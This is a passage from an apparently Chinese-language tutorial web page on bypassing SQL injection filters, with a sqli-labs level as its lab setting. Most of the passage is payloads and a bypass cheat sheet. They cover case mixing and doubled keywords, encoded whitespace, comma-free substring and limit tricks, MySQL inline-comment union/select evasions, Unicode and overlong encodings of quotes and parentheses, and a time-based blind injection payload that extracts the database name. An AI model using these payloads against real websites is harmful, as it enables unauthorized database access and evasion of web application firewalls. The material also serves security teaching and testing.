and和or绕过&quot;">​</a></h3><p>and为同时满足两个条件。例如测试字符型/数字型时用到and1=1和and1=2语句。or为满足其中一个条件即可。例如报错注入时会用到or语句。</p><p><strong>绕过思路</strong></p><ul><li>使用大小写绕过</li><li>复写过滤字符</li><li>用&amp;&amp;取代and，用||取代or</li></ul><p>这里的环境使用level-25。</p><p><img src="https://blog-1304715799.cos.ap-nanjing.myqcloud.com/imgs/image-20240507163318101.png?imageSlim" alt="image-20240507163318101"></p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> and</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> anD</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> anandd </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> &amp;&amp; </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> %</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">26</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">26</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span></code></pre></div><h3 id="_6-3-空格过滤" tabindex="-1">6.3 空格过滤 <a class="header-anchor" href="#_6-3-空格过滤" aria-label="Permalink to &quot;6.3 空格过滤&quot;">​</a></h3><p><strong>绕过思路</strong></p><ul><li>使用+号代替空格</li><li>使用URL编码代替空格</li></ul><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">spaces</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">======%20</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">TAB</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 09</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> horizontal</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> TAB=======%09</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">LF</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> OA</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> newline=====%0A</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">FF</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">C</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> new</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> page=====%0C</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">CR</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">D</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> carriage</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> return======%0D</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">VT</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">B</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> vertical</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> TAB========%0B</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#F69D50;">-OA-(MySQL</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> only</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)==========%A0</span></span></code></pre></div><p>或者使用括号对空格进行绕过：</p><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(user())</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> dual </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">where</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span></span></code></pre></div><p>这种过滤方法常常用于time based盲注,例如：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">?id</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%27and(sleep(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(mid(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">()</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">for</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)))</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">109</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">))%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">23</span></span></code></pre></div><h3 id="_6-4-逗号过滤" tabindex="-1">6.4 逗号过滤 <a class="header-anchor" href="#_6-4-逗号过滤" aria-label="Permalink to &quot;6.4 逗号过滤&quot;">​</a></h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> substr(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> for</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">);</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> mid(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">database</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">from</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> for</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">);</span></span></code></pre></div><p>使用join：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">     #等价于</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> *</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)a </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">join</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> (</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)b</span></span></code></pre></div><p>使用like：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(mid(user(),</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">))</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">=</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">80</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">   #等价于</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> user() </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">like</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;"> &#39;r%&#39;</span></span></code></pre></div><p>对于limit可以使用offset来绕过：</p><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> *</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> news </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 0</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> *</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> from</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> news </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">limit</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> offset </span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">0</span></span></code></pre></div><h3 id="_6-5-union和select过滤" tabindex="-1">6.5 union和select过滤 <a class="header-anchor" href="#_6-5-union和select过滤" aria-label="Permalink to &quot;6.5 union和select过滤&quot;">​</a></h3><p><strong>基本绕过思路</strong></p><ul><li>尝试大小写绕过</li><li>尝试复写单词绕过</li></ul><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> sel</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&lt;&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">ect # 程序过滤</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&lt;&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">为空 脚本处理</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">uNi</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//on</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> sele</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">ct # 程序过滤</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">为空</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> /</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">!%53eLEct</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> # </span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">url</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> 编码与内联注释</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> se%0blect # 使用空格绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> sele%ct # 使用百分号绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> %53eLEct # 编码绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> sELecT</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> #大小写绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN all</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> # ALL绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> DISTINCT</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;"> select</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;"> 1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> # 去重复DISTINCT 绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">null+UNION+SELECT+</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> # 加号代替空格绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">!</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">union//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">!</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">select/</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> # 内联注释绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">!50000union</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">//</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">!50000select</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">/</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> # 内联注释绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">uNIoN//select</span><span style="--shiki-light:#6A737D;--shiki-dark:#768390;">/**/</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">,</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">2</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> # 注释代替空格绕过</span></span></code></pre></div><div class="tip custom-block"><p class="custom-block-title">如下是一些常用的绕过姿势</p><p>SQL注入绕过速查表</p></div><h2 id="七、sql注入绕过速查表" tabindex="-1">七、SQL注入绕过速查表 <a class="header-anchor" href="#七、sql注入绕过速查表" aria-label="Permalink to &quot;七、SQL注入绕过速查表&quot;">​</a></h2><h4 id="过滤and-or" tabindex="-1">过滤and or <a class="header-anchor" href="#过滤and-or" aria-label="Permalink to &quot;过滤and or&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">or</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">     ——</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">    ||</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">and</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">     ——</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">    &amp;&amp;</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">xor	——</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">	|   </span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">not</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">	——</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">	!</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">十六进制绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">or</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> ——</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">&gt;</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> o\\x72</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">大小写绕过</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">Or</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">aNd</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">双写绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">oorr</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">anandd</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">urlencode，</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">char</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)，hex，unicode编码绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">    一些unicode编码举例：</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">    单引号：</span><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">&#39;</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">    %u0027 %u02b9 %u02bc</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">    %u02c8 %u2032</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">    %uff07 %c0%27</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">    %c0%a7 %e0%80%a7</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">   </span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">    </span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">关键字内联注释尝试绕所有</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">/*!or*/</span></span>
<span class="line"><span style="--shiki-light:#032F62;--shiki-dark:#96D0FF;">/*!and*/</span></span></code></pre></div><h4 id="左括号过滤" tabindex="-1">左括号过滤 <a class="header-anchor" href="#左括号过滤" aria-label="Permalink to &quot;左括号过滤&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">urlencode，</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">char</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)，hex，unicode编码绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%u0028 %uff08</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%c0%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">28</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> %c0%a8</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%e0%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">80</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%a8</span></span></code></pre></div><h4 id="右括号过滤" tabindex="-1">右括号过滤 <a class="header-anchor" href="#右括号过滤" aria-label="Permalink to &quot;右括号过滤&quot;">​</a></h4><div class="language-sql vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">sql</span><pre class="shiki shiki-themes github-light github-dark-dimmed vp-code"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">urlencode，</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">ascii</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">(</span><span style="--shiki-light:#D73A49;--shiki-dark:#F47067;">char</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">)，hex，unicode编码绕过</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%u0029 %uff09</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;">%c0%</span><span style="--shiki-light:#005CC5;--shiki-dark:#6CB6FF;">29</span><span style="--shiki-light:#24292E;--shiki-dark:#ADBAC7;"> %c0%a9</span></span>
